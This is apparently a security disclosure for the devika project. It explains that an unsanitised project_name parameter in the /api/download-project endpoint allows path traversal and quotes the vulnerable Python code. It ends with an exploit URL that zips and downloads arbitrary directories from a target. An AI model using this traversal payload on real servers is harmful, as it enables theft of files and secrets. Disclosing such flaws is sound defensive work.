# Description
`devika` opens remote API endpoint at `1337` port at default for further interactions. Nevertheless, lack of sanitization at `devika/src/apis/project.py` allowed arbitrary file download with the whole directory wrapped in a `.zip` file.

 # Proof of Concept
`./devika/src/apis/project.py`

```python
@project_bp.route("/api/download-project", methods=["GET"])
@route_logger(logger)
def download_project():
    project_name = request.args.get("project_name")
    manager.project_to_zip(project_name)
    project_path = manager.get_zip_path(project_name)
    return send_file(project_path, as_attachment=False)
```

`./devika/src/project.py`

```python
    def project_to_zip(self, project: str):
        project_path = self.get_project_path(project)
        zip_path = f"{project_path}.zip"

        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(project_path):
                for file in files:
                    relative_path = os.path.relpath(os.path.join(root, file), os.path.join(project_path, '..'))
                    zipf.write(os.path.join(root, file), arcname=relative_path)
```

```python
    def get_project_path(self, project: str):
        return os.path.join(self.project_path, project.lower().replace(" ", "-"))
```

Thus, exploiting

```
http://<TARGET>:<PORT>/api/download-project?project_name=../../../../../../../../../..<ABSOLUTE_PATH_TO_FODLER>
```

will download:
![image-20240412092214917](https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202404120922948.png)